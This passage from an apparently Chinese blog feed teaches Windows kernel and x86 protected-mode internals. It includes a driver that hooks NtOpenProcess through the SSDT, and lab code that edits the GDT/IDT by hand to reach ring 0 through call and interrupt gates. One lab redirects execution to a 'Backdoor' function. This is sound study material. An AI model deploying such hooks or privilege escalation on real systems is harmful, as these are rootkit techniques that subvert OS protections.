punctuation">)</span><span class="token punctuation">(</span>ProcessHandle<span class="token punctuation">,</span> DesiredAccess<span class="token punctuation">,</span> ObjectAttributes<span class="token punctuation">,</span> ClientId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 挂钩</span>NTSTATUS <span class="token function">SetHook</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">PageProtectOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OriginNtOpenProcess <span class="token operator">=</span> KeServiceDescriptorTable<span class="token operator">-></span>ntoskrnl<span class="token punctuation">.</span>ServiceTableBase<span class="token punctuation">[</span><span class="token number">0x7A</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    KeServiceDescriptorTable<span class="token operator">-></span>ntoskrnl<span class="token punctuation">.</span>ServiceTableBase<span class="token punctuation">[</span><span class="token number">0x7A</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span>Hook<span class="token punctuation">;</span>    <span class="token function">PageProtectOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"NtOpenProcess Has Been Hooked!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 脱钩</span>NTSTATUS <span class="token function">UnsetHook</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">PageProtectOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    KeServiceDescriptorTable<span class="token operator">-></span>ntoskrnl<span class="token punctuation">.</span>ServiceTableBase<span class="token punctuation">[</span><span class="token number">0x7A</span><span class="token punctuation">]</span> <span class="token operator">=</span> OriginNtOpenProcess<span class="token punctuation">;</span>    <span class="token function">PageProtectOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"NtOpenProcess Has Been Unhooked!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 卸载驱动</span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriObj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">UnsetHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Unload Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriver<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Load Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pDriver<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    <span class="token function">SetHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><ul><li>羽夏的博客：<a href="https://www.cnblogs.com/wingsummer/p/15530605.html">https://www.cnblogs.com/wingsummer/p/15530605.html</a></li><li>lzyddf的博客：<a href="https://blog.csdn.net/qq_41988448/category_9429987_2.html">https://blog.csdn.net/qq_41988448/category_9429987_2.html</a></li><li>周壑的视频教程： <a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296">https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-驱动&quot;&gt;&lt;a href=&quot;#1-驱动&quot; class=&quot;headerlink&quot; title=&quot;1 驱动&quot;&gt;&lt;/a&gt;1 驱动&lt;/h2&gt;&lt;h3 id=&quot;1-1-内核编程基础&quot;&gt;&lt;a href=&quot;#1-1-内核编程基础&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
  <entry>
    <title>保护模式——Windows安全入门（二）</title>
    <link href="http://reop.cc/Windows/ef0c23ba92f6.html"/>
    <id>http://reop.cc/Windows/ef0c23ba92f6.html</id>
    <published>2024-03-08T16:00:00.000Z</published>
    <updated>2024-03-28T12:27:55.345Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-段"><a href="#1-段" class="headerlink" title="1 段"></a>1 段</h2><h3 id="1-1-段选择子"><a href="#1-1-段选择子" class="headerlink" title="1.1 段选择子"></a>1.1 段选择子</h3><p><img src="/images/2-1.png" alt="2-1"><br>段选择子位于段寄存器的低16位，是唯一可见的部分，用来定位GDT或LDT中的段描述符；</p><ul><li>RPL：请求级别；</li><li>TI：0时查看GDT，1时查看LDT；</li><li>Index：GDT或LDT的偏移，需要左移3位；</li></ul><h3 id="1-2-段寄存器"><a href="#1-2-段寄存器" class="headerlink" title="1.2 段寄存器"></a>1.2 段寄存器</h3><p><img src="/images/2-2.png" alt="2-2"><br>段寄存器分为可见的段选择子部分（16bits），和不可见部分的Base（32bits），Limit（32bits），Attribute（16bits）；<br>处理器通过可见部分的选择子指向的段描述符获取到段寄存器的不可见部分；</p><h3 id="1-3-段描述符"><a href="#1-3-段描述符" class="headerlink" title="1.3 段描述符"></a>1.3 段描述符</h3><p><img src="/images/2-3.png" alt="2-3"><br>段寄存器位于GDT和LDT中，为处理器提供关于段的各种详细信息；</p><ul><li>P：1时该段表示有效，0时表示无效；</li><li>Base：分3部分存储，共32bits，表示段的基地址；</li><li>Limit：分2部分存储，共20bits，表示段的限长，单位由G决定；</li><li>G：1时Limit的单位是bit，0时Limit的单位是4KB；</li><li>S：1时表示该段为代码段或数据段，0时表示该段为系统段；</li><li><em>Type：受S影响，标识段的类型，权限和增长方向；</em></li><li><em>DB：标识访问方式，对不同段的影响不同；</em></li><li>DPL：段的特权级别；</li><li>AVL：操作系统使用，指示是否可供系统软件使用；</li></ul><h3 id="1-4-代码段跳转"><a href="#1-4-代码段跳转" class="headerlink" title="1.4 代码段跳转"></a>1.4 代码段跳转</h3><p>权限划分：</p><ul><li>CPL：当前CPU权限级别；</li><li>DPL：要求特权级别；</li><li>RPL：请求特权级别；<br>代码段分类：</li><li>一致代码段：允许低特权程序访问高特权代码段，反之不允许；</li><li>非一致代码段：只允许同级访问；<br>代码间的段间跳转：</li></ul><ol><li>拆分段选择子；</li><li>查找GDT得到段描述符；</li><li>权限检查：<ul><li>一致代码段：RPL&gt;&#x3D;CPL</li><li>非一致代码段：RPL &gt;&#x3D; CPL &amp;&amp; CPL &#x3D;&#x3D; DPL</li></ul></li><li>加载段描述符：CPU将新的段描述符加载到CS中；</li><li>执行代码：将CS.Base + [Offset] 写入EIP；</li></ol><h3 id="1-5-任务段"><a href="#1-5-任务段" class="headerlink" title="1.5 任务段"></a>1.5 任务段</h3><p>任务段（TSS）是一段固定大小的内存（104 BYTE），本意是用来存储各个寄存器的值，实现任务之间的快速切换：<br><img src="/images/2-11.png" alt="2-11"><br>任务段描述符和普通段描述符结构类似，同样位于GDT中：<br><img src="/images/2-12.png" alt="2-12"><br>任务段寄存器（TR）和普通的段寄存器的结构相同：<br><img src="/images/2-13.png" alt="2-13"></p><h2 id="2-门"><a href="#2-门" class="headerlink" title="2 门"></a>2 门</h2><h3 id="2-1-调用门"><a href="#2-1-调用门" class="headerlink" title="2.1 调用门"></a>2.1 调用门</h3><p><img src="/images/2-4.png" alt="2-4"><br>调用门描述符也在GDT中，和段描述符类似，但是包含了一个新的选择子和段偏移。在通过权限检查后，段选择子被加载到CS中，段偏移表明了调用过程的入口地址，在段选择子加载新的段描述符时会再次进行权限检查。</p><ul><li>Selector：新的段选择子；</li><li>Offset：新的段偏移；</li><li>ParamCount：如果长调用涉及栈切换时，标识栈之间拷贝参数的个数；<br>短调用：不切换代码段，栈中只压入返回地址；<br>长调用：<br>  如果没有权限提升，栈中依次压入调用者CS，返回地址；<br>  如果有权限提升，由于SS的特权级必须和CS一致，栈在依次压入的是调用者SS，调用者ESP，调用者CS，返回地址；</li></ul><h4 id="实验1：无参调用门提权"><a href="#实验1：无参调用门提权" class="headerlink" title="实验1：无参调用门提权"></a>实验1：无参调用门提权</h4><p>手动修改GDT：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eq <span class="token number">8003f</span><span class="token number">090</span> <span class="token number">00</span>cf9a00`<span class="token number">0000ffff</span>eq <span class="token number">8003f</span><span class="token number">098</span> <span class="token number">0040</span>ec00`<span class="token number">00901000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_tmp<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">3</span><span class="token punctuation">;</span>  pushad<span class="token punctuation">;</span>  pushfd<span class="token punctuation">;</span>  mov eax<span class="token punctuation">,</span> ds<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0x8003f098</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>  mov g_tmp<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>  popfd<span class="token punctuation">;</span>  popad<span class="token punctuation">;</span>  retf<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  call fword ptr ds <span class="token operator">:</span> <span class="token punctuation">[</span>buffer<span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> g_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实验2：有参调用门提权"><a href="#实验2：有参调用门提权" class="headerlink" title="实验2：有参调用门提权"></a>实验2：有参调用门提权</h4><p>手动修改GDT：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eq <span class="token number">8003f</span><span class="token number">090</span> <span class="token number">00</span>cf9a00`<span class="token number">0000ffff</span>eq <span class="token number">8003f</span><span class="token number">098</span> <span class="token number">0040</span>ec03`<span class="token number">00901000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_tmp<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">3</span><span class="token punctuation">;</span>  pushad<span class="token punctuation">;</span>  pushfd<span class="token punctuation">;</span>  mov eax<span class="token punctuation">,</span> ds<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0x8003f098</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>  mov g_tmp<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>  popfd<span class="token punctuation">;</span>  popad<span class="token punctuation">;</span>  retf <span class="token number">0xc</span><span class="token punctuation">;</span> <span class="token comment">//平栈</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  push <span class="token number">1</span><span class="token punctuation">;</span>  push <span class="token number">2</span><span class="token punctuation">;</span>  push <span class="token number">3</span><span class="token punctuation">;</span>  call fword ptr ds <span class="token operator">:</span> <span class="token punctuation">[</span>buffer<span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> g_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实验3：调用门逃逸"><a href="#实验3：调用门逃逸" class="headerlink" title="实验3：调用门逃逸"></a>实验3：调用门逃逸</h4><p>手动修改GDT（和实验1一样，但是这里编译后代码中的IdtEntry地址变了）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eq <span class="token number">8003f</span><span class="token number">090</span> <span class="token number">00</span>cf9a00`<span class="token number">0000ffff</span>eq <span class="token number">8003f</span><span class="token number">098</span> <span class="token number">0040</span>ec00`<span class="token number">00901050</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>代码（0x401000是Backdoor函数的地址）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_tmp<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">3</span><span class="token punctuation">;</span>  pushad<span class="token punctuation">;</span>  pushfd<span class="token punctuation">;</span>  mov eax<span class="token punctuation">,</span> ds<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0x8003f098</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>  mov g_tmp<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>  mov dword ptr<span class="token punctuation">[</span>esp <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x401000</span><span class="token punctuation">;</span> <span class="token comment">// 修改返回地址</span>  popfd<span class="token punctuation">;</span>  popad<span class="token punctuation">;</span>  retf<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  call fword ptr ds <span class="token operator">:</span> <span class="token punctuation">[</span>buffer<span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">Backdoor</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401050</span><span class="token operator">||</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>Backdoor <span class="token operator">!=</span> <span class="token number">0x401000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Backdoor Addr: %p\n"</span><span class="token punctuation">,</span> Backdoor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"g_tmp: %p\n"</span><span class="token punctuation">,</span> g_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/2-8.png" alt="2-8"></p><h3 id="2-2-中断门"><a href="#2-2-中断门" class="headerlink" title="2.2 中断门"></a>2.2 中断门</h3><p><img src="/images/2-5.png" alt="2-5"><br>位于IDT中，与调用门类似，Type部分是固定的，D在32位模式下就是1；</p><h4 id="实验4：中断门提权"><a href="#实验4：中断门提权" class="headerlink" title="实验4：中断门提权"></a>实验4：中断门提权</h4><p>手动修改IDT：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eq <span class="token number">8003f</span><span class="token number">500</span> <span class="token number">0040</span>ee00`<span class="token number">00081000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_tmp<span class="token punctuation">;</span>DWORD g_stack<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  pushfd  pop eax  mov g_tmp<span class="token punctuation">,</span> eax  mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>  mov g_stack<span class="token punctuation">,</span> eax  mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>  mov g_stack<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> eax  mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span>  mov g_stack <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> eax  mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">]</span>  mov g_stack <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">,</span> eax  iretd <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">0x20</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"g_tmp: %p\n"</span><span class="token punctuation">,</span> g_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> g_stack<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/2-9.png" alt="2-9"></p><h3 id="2-3-陷阱门"><a href="#2-3-陷阱门" class="headerlink" title="2.3 陷阱门"></a>2.3 陷阱门</h3><p><img src="/images/2-6.png" 